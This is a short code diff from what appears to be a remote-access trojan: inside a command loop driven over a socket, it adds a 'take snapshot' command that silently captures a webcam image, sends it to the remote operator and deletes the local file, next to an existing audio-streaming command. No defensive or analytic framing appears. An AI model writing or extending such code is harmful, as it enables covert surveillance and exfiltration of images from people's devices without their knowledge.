@@ -81,8 +81,17 @@ while True:
         p = threading.Thread(target=sending_audio_data)
         p.start()
 
-    elif command == "webcam image" or command == "wi":
-        pass
+    elif command == "take snapshot" or command == "tss":
+        camera = cv2.VideoCapture(0)
+        for i in range(10):
+            return_value, image = camera.read()
+            cv2.imwrite('snapshot.png', image)
+        del(camera)
+        s.send("Taken Snapshot".encode("utf-8"))
+        with open("snapshot.png","rb") as file:
+            data = file.read(609600)
+            s.send(data)
+        os.remove("snapshot.png")
      
 
     elif command != "":
